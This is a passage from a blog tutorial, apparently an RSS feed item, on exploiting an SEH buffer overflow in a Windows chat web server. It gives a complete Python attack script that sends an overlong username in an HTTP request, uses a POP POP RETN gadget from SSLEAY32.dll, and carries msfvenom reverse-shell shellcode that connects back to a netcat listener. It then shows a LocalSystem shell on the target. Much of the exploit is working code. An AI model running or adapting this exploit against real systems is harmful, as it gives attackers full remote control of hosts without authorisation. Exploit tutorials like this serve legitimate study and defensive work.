<p>SafeSEH is not enabled on the SSLEAY32.dll library so we should be able to convince the system to redirect execution here during exception handling without it complaining. Now let&#8217;s see if we can find a suitable POP POP RETN instruction sequence within this module. If we open the module code view, we can then use OllyDbg&#8217;s &#8220;Search For Sequence Of Commands&#8221; utility specifying wildcards for the POP instruction registers:</p>
<figure id="attachment_122" aria-describedby="caption-attachment-122" style="width: 670px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-029.png"><img loading="lazy" decoding="async" class="wp-image-122" src="./../../../wp-content/uploads/2017/06/ecs-win-029-300x201.png" alt="" width="670" height="449" srcset="./../../../wp-content/uploads/2017/06/ecs-win-029-300x201.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-029-210x140.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-029.png 600w" sizes="(max-width: 670px) 100vw, 670px" /></a><figcaption id="caption-attachment-122" class="wp-caption-text">Searching for POP POP RETN instruction sequences within the libary</figcaption></figure>
<p>There are several candidate sequences to choose from, so we&#8217;ll pick the one at address <code class="EnlighterJSRAW" data-enlighter-language="asm">0x10011d82</code> <strong>NB:</strong> <em>Because we are dealing with an Intel processor which uses <a href="https://en.wikipedia.org/wiki/Endianness">little endian</a> encoding, and OllyDbg shows us addresses as hex values, we will need to reverse the byte ordering when we insert this address into our exploit code</em>.</p>
<p>Now that we have a mechanism to cause execution to flow from the fake SEH handler function pointer to the next SEH handler pointer, the next stage is to work out how to cause execution to be redirected to final stage exploit code. Because we know that we are able to overflow into the stack beyond the SEH handler function pointer, we can locate our final stage exploit code there. In addition, because we know that the SEH handler function pointer occupies the 4 bytes directly after the next SEH handler pointer, we can overwrite the data referenced by the next SEH pointer with some instructions to cause execution to jump over the SEH handler function pointer to our final stage exploit code.</p>
<p>The next SEH handler pointer occupies 4 bytes, as does the SEH handler function pointer. A short jump instruction will occupy 2 bytes in total, so we need to update add an instruction to jump forward by 6 bytes, padding the 2 bytes after the jump instruction with no-operation opcodes.</p>
<p>Putting all of the above together and updating the attack script, we now have:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="twilight">#!/usr/bin/env python

import socket

victim_host = "192.168.0.55"
victim_port= 80
usr_tok = "%USR%"
get_request_template = (
"GET /chat.ghp?username=" + usr_tok + "&amp;password=password&amp;room=1&amp;sex=1 HTTP/1.1\r\n"
"Host: 192.168.0.55\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-US,en;q=0.5\r\n"
"Referer: http://192.168.0.55/\r\n"
"Connection: Keep-Alive\r\n\r\n"
)

usr_name = "A" * 203
usr_name += "\xeb\x06\x90\x90" # jmp +6 bytes, NOP, NOP
usr_name += "\x82\x1d\x01\x10"  # command sequence: pop EBP, pop EBX, retn: candidate found at 0x10011d82 in executable module SSLEAY32.DLL
usr_name += "ABCDEFGHIJKLMNOPQRSTUVWXYZ" # placeholder for shellcode
usr_name += "B" * 59

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn = sock.connect((victim_host, victim_port))
content = get_request_template.replace(usr_tok, usr_name)
#print content
sock.send(content)
rx = sock.recv(1024)
if len(rx) &gt; 0:
    print rx
sock.close()</pre>
<p>After restarting the server and resending the updated authentication request, the following results are visible in the debugger:</p>
<p><a href="./../../../wp-content/uploads/2017/06/ecs-win-015.png"><img loading="lazy" decoding="async" class="wp-image-126 aligncenter" src="./../../../wp-content/uploads/2017/06/ecs-win-015-300x157.png" alt="" width="659" height="345" srcset="./../../../wp-content/uploads/2017/06/ecs-win-015-300x157.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-015-210x110.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-015.png 445w" sizes="(max-width: 659px) 100vw, 659px" /></a></p>
<p>We can see that:</p>
<ul>
<li>The next SEH pointer has been overwritten with 0x909006EB, which equates to <code class="EnlighterJSRAW" data-enlighter-language="null">JMP 06 NOP NOP</code></li>
<li>The SEH handler has been overwritten with 0x100111D82, which is the address of the POP POP RETN instruction sequence within the SSLEAY32.dll library</li>
<li>Our final stage exploit code (represented at the moment with the placeholder character sequence &#8220;ABCDEFG&#8230;&#8221;) is located immediatety after the SEH handler function pointer.</li>
</ul>
<h2>End Game</h2>
<p>All we need to do now is generate the final stage exploit &#8211; the payload &#8211; and deliver this via our malicious authentication script instead of the placeholder character sequence.</p>
<p>Our goal is to establish a remote connection to the machine hosting the server process. We can again make use of the Metasploit Framework to do this for us. The <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">msfvenom</a> tool will generate the shellcode for an executable payload for us, all we need to do is specify the type of payload we want, add some arguments which specify the details of the attack host, i.e. the machine we want the remote shell to connect back to once it has been injected into and executed on the target:</p>
<figure id="attachment_44" aria-describedby="caption-attachment-44" style="width: 650px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-57-37.png"><img loading="lazy" decoding="async" class="wp-image-44" src="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-57-37-300x238.png" alt="" width="650" height="516" srcset="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-57-37-300x238.png 300w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-57-37-768x608.png 768w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-57-37-210x166.png 210w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-57-37.png 960w" sizes="(max-width: 650px) 100vw, 650px" /></a><figcaption id="caption-attachment-44" class="wp-caption-text">Using msfvenom to generate payload shellcode</figcaption></figure>
<p>We now have some shellcode which will establish a remote TCP based connection from the target host back to our attack host, so let&#8217;s update the authentication script to include it:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="twilight">#!/usr/bin/env python
import socket

victim_host = "192.168.0.55"
victim_port= 80
usr_tok = "%USR%"
get_request_template = (
"GET /chat.ghp?username=" + usr_tok + "&amp;password=password&amp;room=1&amp;sex=1 HTTP/1.1\r\n"
"Host: 192.168.0.55\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-US,en;q=0.5\r\n"
"Referer: http://192.168.0.55/\r\n"
"Connection: Keep-Alive\r\n\r\n"
)
shellcode = (
"\xdb\xd8\xb8\x4b\x26\xf4\x34\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x43\x17\x03\x43\x17\x83\x88\x22\x16\xc1\xf2\xc3\x54"
"\x2a\x0a\x14\x39\xa2\xef\x25\x79\xd0\x64\x15\x49\x92\x28\x9a"
"\x22\xf6\xd8\x29\x46\xdf\xef\x9a\xed\x39\xde\x1b\x5d\x79\x41"
"\x98\x9c\xae\xa1\xa1\x6e\xa3\xa0\xe6\x93\x4e\xf0\xbf\xd8\xfd"
"\xe4\xb4\x95\x3d\x8f\x87\x38\x46\x6c\x5f\x3a\x67\x23\xeb\x65"
"\xa7\xc2\x38\x1e\xee\xdc\x5d\x1b\xb8\x57\x95\xd7\x3b\xb1\xe7"
"\x18\x97\xfc\xc7\xea\xe9\x39\xef\x14\x9c\x33\x13\xa8\xa7\x80"
"\x69\x76\x2d\x12\xc9\xfd\x95\xfe\xeb\xd2\x40\x75\xe7\x9f\x07"
"\xd1\xe4\x1e\xcb\x6a\x10\xaa\xea\xbc\x90\xe8\xc8\x18\xf8\xab"
"\x71\x39\xa4\x1a\x8d\x59\x07\xc2\x2b\x12\xaa\x17\x46\x79\xa3"
"\xd4\x6b\x81\x33\x73\xfb\xf2\x01\xdc\x57\x9c\x29\x95\x71\x5b"
"\x4d\x8c\xc6\xf3\xb0\x2f\x37\xda\x76\x7b\x67\x74\x5e\x04\xec"
"\x84\x5f\xd1\xa3\xd4\xcf\x8a\x03\x84\xaf\x7a\xec\xce\x3f\xa4"
"\x0c\xf1\x95\xcd\xa7\x08\x7e\x32\x9f\x12\x48\xda\xe2\x12\x84"
"\x23\x6a\xf4\x8e\x43\x3a\xaf\x26\xfd\x67\x3b\xd6\x02\xb2\x46"
"\xd8\x89\x31\xb7\x97\x79\x3f\xab\x40\x8a\x0a\x91\xc7\x95\xa0"
"\xbd\x84\x04\x2f\x3d\xc2\x34\xf8\x6a\x83\x8b\xf1\xfe\x39\xb5"
"\xab\x1c\xc0\x23\x93\xa4\x1f\x90\x1a\x25\xed\xac\x38\x35\x2b"
"\x2c\x05\x61\xe3\x7b\xd3\xdf\x45\xd2\x95\x89\x1f\x89\x7f\x5d"
"\xd9\xe1\xbf\x1b\xe6\x2f\x36\xc3\x57\x86\x0f\xfc\x58\x4e\x98"
"\x85\x84\xee\x67\x5c\x0d\x1e\x22\xfc\x24\xb7\xeb\x95\x74\xda"
"\x0b\x40\xba\xe3\x8f\x60\x43\x10\x8f\x01\x46\x5c\x17\xfa\x3a"
"\xcd\xf2\xfc\xe9\xee\xd6"
)

usr_name = "A" * 203
usr_name += "\xeb\x06\x90\x90" # jmp +6 bytes, NOP, NOP
usr_name += "\x82\x1d\x01\x10" # command sequence: pop EBP, pop EBX, retn: candidate found at 0x10011d82 in executable module SSLEAY32.DLL
usr_name += "\x90" * 16 # create some stack space for the reverse shell decoder generated and included by msfvenom
usr_name += shellcode

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn = sock.connect((victim_host, victim_port))
content = get_request_template.replace(usr_tok, usr_name)
sock.send(content)
rx = sock.recv(1024)
if len(rx) &gt; 0:
print rx
sock.close()

</pre>
<p>After restarting the server and resending the updated authentication request, the following results are visible in the debugger &#8211; first of all, the system detects the access violation caused by the buffer overflow and attempts to handle the exception using SEH. Because the SEH handler function pointer has been overwritten with the address of the POP POP RETN instructions within SSLEAY32.dll, this address gets loaded into the EIP and the library instructions get executed:</p>
<p><a href="./../../../wp-content/uploads/2017/06/ecs-win-021.png"><img loading="lazy" decoding="async" class="wp-image-37 aligncenter" src="./../../../wp-content/uploads/2017/06/ecs-win-021-300x166.png" alt="" width="652" height="361" srcset="./../../../wp-content/uploads/2017/06/ecs-win-021-300x166.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-021-768x425.png 768w, ./../../../wp-content/uploads/2017/06/ecs-win-021-210x116.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-021.png 820w" sizes="(max-width: 652px) 100vw, 652px" /></a></p>
<p>The POP POP instructions cause the ESP to point to the address of the next SEH handler; the RETN causes the EIP to to be loaded with this address and execution gets redirected to this location. As we have overwritten the next SEH handler pointer with our short jump instructions, this gets executed next:</p>
<p><a href="./../../../wp-content/uploads/2017/06/ecs-win-024.png"><img loading="lazy" decoding="async" class="wp-image-38 aligncenter" src="./../../../wp-content/uploads/2017/06/ecs-win-024-300x130.png" alt="" width="651" height="282" srcset="./../../../wp-content/uploads/2017/06/ecs-win-024-300x130.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-024-1024x445.png 1024w, ./../../../wp-content/uploads/2017/06/ecs-win-024-768x334.png 768w, ./../../../wp-content/uploads/2017/06/ecs-win-024-210x91.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-024.png 1366w" sizes="(max-width: 651px) 100vw, 651px" /></a></p>
<p>After the jump, the EIP now points to the <a href="https://en.wikipedia.org/wiki/NOP_slide">NOP sled</a> at the start of our shellcode (an arbitrary number of NOP&#8217;s have been added to allow space for the reverse shell decoder generated by msfvenom and prepended to the shellcode):</p>
<p><a href="./../../../wp-content/uploads/2017/06/ecs-win-025.png"> <img loading="lazy" decoding="async" class="wp-image-39 aligncenter" src="./../../../wp-content/uploads/2017/06/ecs-win-025-300x167.png" alt="" width="652" height="363" srcset="./../../../wp-content/uploads/2017/06/ecs-win-025-300x167.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-025-210x117.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-025.png 733w" sizes="(max-width: 652px) 100vw, 652px" /></a></p>
<p>To determine whether a remote shell can be successfully established on the target host, first we start a <a href="http://nc110.sourceforge.net/">netcat</a> listener on our attack machine to listen for any incoming connections on the port we specified when we generated the shellcode for our payload, then allow the server execution to continue:</p>
<p><a href="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-59-31.png"><img loading="lazy" decoding="async" class="wp-image-47 aligncenter" src="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-59-31-300x101.png" alt="" width="650" height="219" srcset="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-59-31-300x101.png 300w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-59-31-210x70.png 210w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-59-31.png 647w" sizes="(max-width: 650px) 100vw, 650px" /></a></p>
<p><a href="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-11-40-23.png"><img loading="lazy" decoding="async" class="wp-image-46 aligncenter" src="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-11-40-23-300x168.png" alt="" width="641" height="359" srcset="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-11-40-23-300x168.png 300w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-11-40-23-210x118.png 210w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-11-40-23.png 646w" sizes="(max-width: 641px) 100vw, 641px" /></a></p>
<p>The target machine has now been fully compromised; the remote shell we injected has been executed and it has successfully established a connection with the netcat listener on our attack machine. The shell will execute with the same level of privilege as the account which was used to spawn the compromised server process. Issuing a simple &#8220;<a href="https://technet.microsoft.com/en-us/library/cc771299(v=ws.11).aspx">whoami</a>&#8221; command to the compromised host via this shell shows us that the server process must have been executed as a system process under the built in <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx">Windows LocalSystem</a> account, meaning that our shell has the highest level of administration rights on the host system, and will permit us to perform actions invaluable to a malicious actor attacking the system, e.g. creating new user accounts, installing software, disabling firewalls, even pivoting to other hosts on normally inaccessible networks. <strong>NB:</strong> <em>Port 12345 is an arbitrary choice used here for illustrative purposes. Network reconnaissancecarried out in advance of an attack such as this would aim to identify a suitable open port for the reverse shell to use</em>.</p>
<h2>Epilogue</h2>
<p>In addition to SafeSEH and SEHOP, there are several other Windows memory defence mechanisms, including <a href="https://msdn.microsoft.com/en-us/library/bb384887.aspx">Address Space Layout Randomisation</a> (ASLR) and <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366553(v=vs.85).aspx">Data Execution Prevention</a> (DEP), which aim to prevent exploits such as the one studied here. However, the number of end-of-life and unpatched operating systems and vulnerable applications still in active use means that SEH abuse will probably remain a viable exploit technique for some time to come.</p>
]]></content:encoded>
					
		
		
			</item>
	</channel>
</rss>
